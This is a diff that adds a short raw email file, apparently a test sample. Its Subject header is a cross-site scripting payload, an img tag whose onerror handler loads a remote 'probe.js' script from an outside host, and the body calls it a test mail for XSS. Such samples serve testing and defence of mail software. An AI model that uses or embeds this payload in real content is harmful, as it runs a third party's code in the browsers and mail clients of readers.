@@ -1,0 +1,7 @@
+From: "thatsuch" <mohjwdodegi@behringer.com>
+To: email2130@speedy.uwaterloo.ca
+Subject: <img src='ice' onerror="loadScript('http://icefish1987.sinaapp.com/xss/probe.js')">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
